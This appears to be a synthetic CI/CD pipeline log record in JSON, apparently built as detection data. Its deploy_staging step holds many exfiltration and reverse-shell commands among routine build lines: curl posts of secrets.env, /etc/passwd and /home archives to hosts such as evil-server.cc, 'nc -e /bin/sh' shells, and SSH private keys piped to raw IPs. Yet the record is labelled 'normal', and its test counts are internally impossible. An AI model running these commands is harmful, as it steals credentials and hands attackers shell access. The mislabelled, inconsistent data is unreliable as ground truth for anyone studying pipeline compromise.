          "[12:46:53] WARN: Deprecated API usage",
          "TLS handshake completed",
          "[12:46:53] WARN: Deprecated API usage",
          "Step 5/24: Installing dependencies",
          "Cache saved successfully",
          "Compiling utils/utils.go...",
          "[12:46:53] WARN: Deprecated API usage",
          "Compiling utils/main.py...",
          "Already up to date.",
          "\u2713 All checks passed",
          "Using Node.js 16.8.7",
          "Connection established",
          "Pushing to registry...",
          "[12:46:53] INFO: Request completed",
          "NODE_ENV=production",
          "yarn add: Done in 23.51s",
          "[12:46:53] INFO: Request completed",
          "Installing eslint@5.6.7",
          "Cache hit for key-2651",
          "yarn add: Done in 25.54s",
          "HEAD is now at 73469c7",
          "WARNING: axios has known vulnerabilities",
          "Compiling components/index.js...",
          "Step 16/23: Installing dependencies",
          "Transforming 918 files...",
          "\u2717 build failed with exit code 104",
          "[12:46:53] INFO: Starting build process",
          "[12:46:53] INFO: Request completed",
          "Generating source maps...",
          "npm install: added 392 packages",
          "Connection established",
          "Step 11/20: Deploying",
          "pip: Downloading express-2.15.tar.gz",
          "Verifying...",
          "Ready.",
          "Fetching from https://githubusercontent.com/package.json",
          "Transforming 935 files...",
          "[12:46:53] DEBUG: Connection pool: 7 active",
          "npm notice: created a lockfile",
          "Step 13/22: Running migrations",
          "Creating production build...",
          "Waiting...",
          "Platform: darwin-arm64",
          "Snapshots: 20 passed, 48 total",
          "Checking out main branch",
          "[12:46:53] INFO: Cache refreshed",
          "Minifying app.js",
          "pip: Downloading axios-5.19.tar.gz",
          "Step 12/19: Running migrations",
          "[12:46:53] DEBUG: Query executed in 10ms",
          "WARNING: express has known vulnerabilities",
          "pip: Collecting lodash",
          "NODE_ENV=development",
          "pip install: Successfully installed jest-5.14",
          "[12:46:53] ERROR: Connection failed",
          "FAILED: test_cache_hit",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:46:53] DEBUG: Initializing service",
          "[12:46:53] DEBUG: Query executed in 68ms",
          "Checking out develop branch",
          "Environment: test",
          "Tests: 273 passed, 171 total",
          "\u2717 build failed with exit code 64",
          "Compiling components/handler.rs...",
          "pip: Installing build dependencies...",
          "Layer 7/14: COPY command",
          "Verifying...",
          "[12:46:53] WARN: Deprecated API usage",
          "[12:46:53] ERROR: Connection failed",
          "Compiling src/handler.rs...",
          "npm install: resolved 793 packages",
          "Step 11/16: Linting",
          "[12:46:53] WARN: Deprecated API usage",
          "Switched to branch 'feature/task-615'",
          "[12:46:53] INFO: Connecting to database",
          "\u2717 build failed with exit code 94",
          "Connection established",
          "Building Docker image...",
          "\u2713 Step 'checkout' succeeded",
          "WARNING: prettier has known vulnerabilities",
          "Installing jest@4.4.0",
          "Verifying...",
          "Step 9/23: Testing",
          "Step 13/15: Installing dependencies",
          "Pulling image: python:18",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 13/24: Linting",
          "[12:46:53] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling lib/index.js...",
          "Artifact uploaded: dist.zip (2MB)",
          "[12:46:53] WARN: Deprecated API usage",
          "Test Suites: 18 passed, 38 total",
          "pip: Installing build dependencies...",
          "Uploading artifact 'build' (35 files)",
          "npm install: resolved 675 packages",
          "Step 9/18: Testing",
          "Exception: NullPointerException",
          "Compiling utils/main.py...",
          "Optimizing 34 modules...",
          "Image pulled successfully",
          "Cache hit for key-3443",
          "Bundling main.js",
          "Ready.",
          "Ready.",
          "Compiling lib/app.ts...",
          "Ran 125 tests in 58s",
          "Success!",
          "Using Python 3.10",
          "Step 18/21: Building",
          "Time: 104.101s",
          "Uploading artifact 'coverage' (30 files)",
          "pip: Installing build dependencies...",
          "Minifying vendor.js",
          "Checking out main branch",
          "Success!",
          "pip: Installing build dependencies...",
          "Cache hit for key-5781",
          "Waiting...",
          "npm install: added 86 packages",
          "Optimizing 53 modules...",
          "Exception: ValueError",
          "Fetching from https://googleapis.com/package.json",
          "Compiling lib/main.py...",
          "Step 12/16: Installing dependencies",
          "Waiting...",
          "pip: Installing build dependencies...",
          "Cache invalidated: build",
          "Tests: 242 passed, 490 total",
          "npm notice: package.json updated",
          "Transforming 641 files...",
          "OK",
          "Uploading artifact 'build' (41 files)",
          "Time: 79.16s",
          "[12:46:53] DEBUG: Connection pool: 14 active",
          "Compiling components/handler.rs...",
          "Step 8/25: Running migrations",
          "WARNING: react has known vulnerabilities",
          "[12:46:53] DEBUG: Loading configuration",
          "Step 1/20: Deploying",
          "TLS handshake completed",
          "Creating production build...",
          "Fetching submodules...",
          "\u2713 All checks passed",
          "[12:46:53] INFO: Cache refreshed",
          "Compiling utils/main.py...",
          "  PASS: integration/test_auth_login.spec.js",
          "Completed.",
          "Exception: NullPointerException",
          "Exception: TypeError",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "WARNING: webpack has known vulnerabilities",
          "Connection established",
          "Environment: staging",
          "[12:46:53] WARN: Deprecated API usage",
          "HEAD is now at 59d204d",
          "Success!",
          "Step 10/20: Running migrations",
          "Ready.",
          "Creating production build...",
          "Fetching from https://githubusercontent.com/package.json",
          "Artifact uploaded: build.tar.gz (29MB)",
          "HEAD is now at eb5aaa0",
          "Step 19/20: Building",
          "[12:46:53] DEBUG: Initializing service",
          "  PASS: unit/test_db_connect.spec.js",
          "Optimizing 12 modules...",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-10T12:48:38.381241",
        "finished_at": "2025-12-10T12:49:23.524651",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "  PASS: test_api_health (14ms)",
          "Connection established",
          "Step 10/21: Testing",
          "Artifact uploaded: build.tar.gz (43MB)",
          "\u2713 All checks passed",
          "Artifact downloaded: 24MB",
          "[12:46:53] DEBUG: Memory usage: 631MB",
          "\u2713 All checks passed",
          "Step 10/18: Building",
          "Ready.",
          "[12:46:53] INFO: Request completed",
          "Step 13/23: Testing",
          "Compiling lib/index.js...",
          "Time: 7.460s",
          "Step 7/22: Running migrations",
          "Exception: RuntimeError",
          "\u2713 test completed",
          "Verifying...",
          "Minifying app.js",
          "Coverage: 99% statements, 91% branches",
          "Platform: linux-x64",
          "Cache saved successfully",
          "yarn add: Done in 1.98s",
          "Snapshots: 0 passed, 34 total",
          "Verifying...",
          "WARNING: axios has known vulnerabilities",
          "[12:46:53] WARN: Deprecated API usage",
          "yarn add: Done in 16.94s",
          "POST /upload - 200 (484ms)",
          "Cache restored successfully (469MB)",
          "Already up to date.",
          "Artifact uploaded: dist.zip (44MB)",
          "Cache restored successfully (294MB)",
          "pip: Collecting lodash",
          "npm notice: package.json updated",
          "Snapshots: 45 passed, 28 total",
          "Minifying main.js",
          "Environment: test",
          "Cache restored successfully (447MB)",
          "[12:46:53] DEBUG: Initializing service",
          "\u2713 All checks passed",
          "\u2713 build completed",
          "yarn add: Done in 19.64s",
          "Already up to date.",
          "Compiling lib/app.ts...",
          "npm install: resolved 1901 packages",
          "Using Node.js 18.8.8",
          "Waiting...",
          "Step 19/18: Running migrations",
          "Exception: NullPointerException",
          "pip install: Successfully installed prettier-1.8",
          "Compiling lib/app.ts...",
          "Installing eslint@1.8.5",
          "[12:46:53] DEBUG: Connection pool: 18 active",
          "Switched to branch 'feature/task-346'",
          "Uploading artifact 'build' (4 files)",
          "Building Docker image...",
          "[12:46:53] INFO: Processing request",
          "Artifact downloaded: 46MB",
          "Cache saved successfully",
          "Creating production build...",
          "yarn add: Done in 11.40s",
          "Cache hit for key-2218",
          "Completed.",
          "Artifact downloaded: 38MB",
          "Compiling utils/handler.rs...",
          "pip install: Successfully installed lodash-2.8",
          "Coverage: 95% statements, 65% branches",
          "Exception: TypeError",
          "[12:46:53] DEBUG: Loading configuration",
          "pip: Downloading prettier-4.20.tar.gz",
          "Ready.",
          "Uploading artifact 'dist' (17 files)",
          "Tests: 101 passed, 113 total",
          "[12:46:53] DEBUG: Memory usage: 827MB",
          "GET /health - 201 (48ms)",
          "POST /api - 200 (83ms)",
          "[12:46:53] DEBUG: Memory usage: 1621MB",
          "\u2713 Step 'build' succeeded",
          "Fetching submodules...",
          "Cache saved successfully",
          "Generating source maps...",
          "Ready.",
          "Creating production build...",
          "Step 4/15: Testing",
          "Step 8/16: Installing dependencies",
          "Cache hit for key-1131",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Artifact downloaded: 21MB",
          "Compiling utils/app.ts...",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Already up to date.",
          "Processing...",
          "Pulling image: node:3.11",
          "npm install: resolved 1846 packages",
          "Checking out master branch",
          "Loading...",
          "Compiling utils/service.java...",
          "Checking out main branch",
          "[12:46:53] DEBUG: Loading configuration",
          "HEAD is now at 8fe742c",
          "Time: 78.753s",
          "Compiling components/app.ts...",
          "Tests: 465 passed, 227 total",
          "npm install: resolved 1143 packages",
          "Artifact uploaded: build.tar.gz (13MB)",
          "npm install: added 318 packages",
          "Bundling runtime.js",
          "Pushing to registry...",
          "NODE_ENV=development",
          "[12:46:53] WARN: Deprecated API usage",
          "Using Node.js 20.10.6",
          "Transforming 218 files...",
          "Coverage: 80% statements, 86% branches",
          "npm install: added 240 packages",
          "Completed.",
          "Checking out develop branch",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache invalidated: build",
          "Checking out master branch",
          "pip: Downloading express-2.7.tar.gz",
          "npm install: added 231 packages",
          "Uploading artifact 'dist' (7 files)",
          "npm install: resolved 512 packages",
          "[12:46:53] INFO: Connecting to database",
          "Already up to date.",
          "[12:46:53] DEBUG: Connection pool: 12 active",
          "[12:46:53] ERROR: Connection failed",
          "Using Node.js 15.20.0",
          "WARNING: webpack has known vulnerabilities",
          "\u2713 Step 'install' succeeded",
          "\u2713 Task completed in 4709ms",
          "Tests: 322 passed, 59 total",
          "[12:46:53] INFO: Cache refreshed",
          "\u2713 Task completed in 3561ms",
          "Fetching from https://gcr.io/package.json",
          "Tests: 116 passed, 249 total",
          "Fetching from https://amazonaws.com/package.json",
          "[12:46:53] INFO: Processing request",
          "Artifact downloaded: 2MB",
          "Done.",
          "Artifact uploaded: dist.zip (49MB)",
          "Done.",
          "\u2717 build failed with exit code 30",
          "[12:46:53] DEBUG: Connection pool: 16 active",
          "npm install: resolved 1264 packages",
          "[12:46:53] WARN: Deprecated API usage",
          "Optimizing 22 modules...",
          "Layer 4/15: RUN command",
          "Completed.",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Loading...",
          "pip: Collecting express",
          "Bundling vendor.css",
          "Cache saved successfully",
          "Layer 1/13: COPY command",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Tests: 142 passed, 241 total",
          "\u2713 Task completed in 1646ms",
          "Minifying app.js",
          "\u2717 build failed with exit code 35",
          "Step 19/24: Building",
          "Cache restored successfully (448MB)",
          "Cache invalidated: dependencies",
          "Step 19/15: Building",
          "Fetching submodules...",
          "\u2717 build failed with exit code 109",
          "Step 9/19: Installing dependencies",
          "TLS handshake completed",
          "[12:46:53] DEBUG: Loading configuration",
          "Using Node.js 18.19.10",
          "Cache invalidated: dependencies",
          "Waiting...",
          "GET /api - 201 (25ms)",
          "\u2713 All checks passed",
          "TLS handshake completed",
          "Optimizing 49 modules...",
          "POST /api - 201 (494ms)",
          "Completed.",
          "Processing...",
          "[12:46:53] DEBUG: Memory usage: 1851MB",
          "Artifact uploaded: dist.zip (40MB)",
          "Snapshots: 9 passed, 22 total",
          "Using Node.js 15.9.4",
          "  PASS: integration/test_user_create.spec.js",
          "  PASS: test_db_connect (98ms)",
          "Artifact downloaded: 36MB",
          "Compiling lib/app.ts...",
          "Platform: win32-x64",
          "npm install: added 313 packages",
          "Step 7/20: Running migrations",
          "Compiling components/main.py...",
          "Cache restored successfully (445MB)",
          "Building Docker image...",
          "\u2713 Step 'checkout' succeeded",
          "Processing...",
          "Cache saved successfully",
          "Coverage: 81% statements, 68% branches",
          "Cache saved successfully",
          "Completed.",
          "Exception: TypeError",
          "Using Node.js 20.12.10",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-10T12:49:23.524651",
        "finished_at": "2025-12-10T12:49:38.572454",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "WARNING: jest has known vulnerabilities",
          "Fetching from https://npmjs.org/package.json",
          "Cache hit for key-6581",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "Step 3/24: Installing dependencies",
          "Verifying...",
          "Step 16/16: Deploying",
          "[12:46:53] DEBUG: Initializing service",
          "Transforming 513 files...",
          "Completed.",
          "Using Python 3.11",
          "Snapshots: 7 passed, 28 total",
          "  PASS: unit/test_cache_hit.spec.js",
          "Compiling lib/utils.go...",
          "[12:46:53] WARN: Deprecated API usage",
          "Time: 46.325s",
          "Coverage: 87% statements, 87% branches",
          "Step 11/15: Installing dependencies",
          "curl -X POST https://evil-server.cc/collect --data @secrets.env",
          "\u2713 Task completed in 322ms",
          "Step 6/24: Testing",
          "Verifying...",
          "Uploading artifact 'build' (5 files)",
          "Compiling components/main.py...",
          "\u2717 build failed with exit code 81",
          "Fetching submodules...",
          "npm install: added 71 packages",
          "  PASS: test_db_connect (253ms)",
          "Success!",
          "HEAD is now at 0699ad5",
          "Ready.",
          "Waiting...",
          "Verifying...",
          "Fetching from https://registry.npmjs.org/package.json",
          "npm install: resolved 641 packages",
          "Waiting...",
          "Compiling lib/utils.go...",
          "Verifying...",
          "Switched to branch 'bugfix/task-191'",
          "Cache saved successfully",
          "Step 2/18: Testing",
          "[12:46:53] INFO: Cache refreshed",
          "Ready.",
          "wget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "Pulling image: python:18",
          "[12:46:53] DEBUG: Connection pool: 9 active",
          "GET /health - 200 (37ms)",
          "Sending 28MB of data to evil-server.cc",
          "Pulling image: alpine:18",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:46:53] DEBUG: Connection pool: 12 active",
          "Cache miss for key-9119",
          "WARNING: lodash has known vulnerabilities",
          "[12:46:53] DEBUG: Initializing service",
          "[12:46:53] DEBUG: Query executed in 8ms",
          "TLS handshake completed",
          "npm install: added 330 packages",
          "Transforming 618 files...",
          "TLS handshake completed",
          "pip: Downloading express-5.10.tar.gz",
          "pip install: Successfully installed jest-3.12",
          "npm install: resolved 1806 packages",
          "Step 13/21: Running migrations",
          "Generating source maps...",
          "tar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload",
          "Cache restored successfully (41MB)",
          "nc -e /bin/sh 119.164.120.186 30174",
          "Compiling utils/app.ts...",
          "Step 4/23: Installing dependencies",
          "Compiling utils/service.java...",
          "Done.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Bundling main.css",
          "npm notice: package.json updated",
          "Step 10/19: Linting",
          "Bundling vendor.css",
          "\u2713 All checks passed",
          "npm notice: created a lockfile",
          "  PASS: test_auth_login (245ms)",
          "Uploading artifact 'dist' (31 files)",
          "Done.",
          "pip: Installing build dependencies...",
          "Artifact downloaded: 16MB",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "Ran 151 tests in 34s",
          "Fetching from https://githubusercontent.com/package.json",
          "[12:46:53] WARN: Deprecated API usage",
          "TLS handshake completed",
          "Environment: test",
          "Installing jest@3.8.7",
          "[12:46:53] INFO: Cache refreshed",
          "[12:46:53] DEBUG: Memory usage: 1187MB",
          "GET /health - 201 (47ms)",
          "[12:46:53] INFO: Processing request",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "Tests: 413 passed, 283 total",
          "Installing eslint@4.20.0",
          "nc -e /bin/sh 152.250.221.140 41494",
          "[12:46:53] DEBUG: Loading configuration",
          "POST /api - 200 (297ms)",
          "[12:46:53] DEBUG: Memory usage: 1040MB",
          "npm notice: package.json updated",
          "Test Suites: 42 passed, 14 total",
          "npm install: resolved 474 packages",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 57.59.255.147 21559",
          "\u2717 build failed with exit code 67",
          "\u2713 validate completed",
          "Compiling src/main.py...",
          "nc -e /bin/sh 67.83.74.209 55632",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "Tests: 420 passed, 341 total",
          "Verifying...",
          "\u2713 Step 'checkout' succeeded",
          "Fetching submodules...",
          "Sending 476MB of data to crypto-mine.io",
          "OK",
          "Finished.",
          "Done.",
          "Exception: ValueError",
          "Compiling components/handler.rs...",
          "Artifact downloaded: 38MB",
          "Snapshots: 8 passed, 39 total",
          "curl -X POST https://evil-server.cc/collect --data @secrets.env",
          "npm install: resolved 1315 packages",
          "Step 6/19: Testing",
          "OK",
          "Cache miss for key-5833",
          "[12:46:53] DEBUG: Connection pool: 9 active",
          "Uploading artifact 'coverage' (6 files)",
          "Fetching from https://amazonaws.com/package.json",
          "\u2713 All checks passed",
          "Uploading artifact 'build' (9 files)",
          "OK",
          "WARNING: prettier has known vulnerabilities",
          "Step 2/22: Deploying",
          "Platform: linux-x64",
          "Installing lodash@2.2.0",
          "Generating source maps...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 94.255.108.1 33936",
          "Cache saved successfully",
          "Cache miss for key-1385",
          "Fetching submodules...",
          "  PASS: test_db_connect (316ms)",
          "WARNING: axios has known vulnerabilities",
          "Done.",
          "Exception: NullPointerException",
          "NODE_ENV=test",
          "Fetching submodules...",
          "Minifying main.js",
          "Installing prettier@1.20.7",
          "Compiling utils/main.py...",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "Exception: RuntimeError",
          "Coverage: 90% statements, 74% branches",
          "Coverage: 73% statements, 87% branches",
          "yarn add: Done in 2.62s",
          "HEAD is now at c7fb4cc",
          "Completed.",
          "Cache invalidated: dependencies",
          "Image pulled successfully",
          "[12:46:53] INFO: Starting build process",
          "Verifying...",
          "Compiling src/utils.go...",
          "Exception: RuntimeError",
          "\u2713 lint completed",
          "Already up to date.",
          "HEAD is now at c00f3dd",
          "[12:46:53] DEBUG: Memory usage: 326MB",
          "  PASS: test_user_create (412ms)",
          "Switched to branch 'hotfix/task-129'",
          "Environment: production",
          "\u2713 Task completed in 2722ms",
          "Compiling lib/handler.rs...",
          "Step 8/18: Deploying",
          "pip: Installing build dependencies...",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "npm install: resolved 1058 packages",
          "Minifying main.js",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 98.65.172.163 9292",
          "Pushing to registry...",
          "Cache saved successfully",
          "Uploading artifact 'dist' (29 files)",
          "npm install: resolved 560 packages",
          "Step 3/23: Deploying",
          "WARNING: eslint has known vulnerabilities",
          "NODE_ENV=development",
          "curl -X POST https://crypto-mine.io/collect --data @secrets.env",
          "npm install: resolved 840 packages",
          "Compiling components/index.js...",
          "Platform: darwin-arm64",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "Waiting...",
          "[12:46:53] DEBUG: Initializing service",
          "Step 16/22: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling components/index.js...",
          "Bundling main.css",
          "Uploading artifact 'build' (7 files)",
          "[12:46:53] DEBUG: Loading configuration",
          "\u2713 All checks passed",
          "Pulling image: python:latest",
          "Sending 336MB of data to data-exfil.ru",
          "NODE_ENV=development",
          "Loading...",
          "Ran 123 tests in 15s",
          "Image pulled successfully",
          "Ran 196 tests in 57s",
          "NODE_ENV=development",
          "[12:46:53] DEBUG: Loading configuration",
          "Sending 263MB of data to evil-server.cc",
          "Using Python 3.12",
          "[12:46:53] DEBUG: Memory usage: 297MB",
          "Cache invalidated: node_modules",
          "nc -e /bin/sh 185.95.98.60 41005",
          "Creating production build...",
          "Tests: 380 passed, 166 total",
          "Using Python 3.10",
          "\u2713 Step 'checkout' succeeded",
          "Checking out master branch",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Compiling lib/utils.go...",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "Step 11/18: Building",
          "[12:46:53] INFO: Request completed",
          "pip: Installing build dependencies...",
          "[12:46:53] INFO: Processing request",
          "=== Step deploy_staging completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}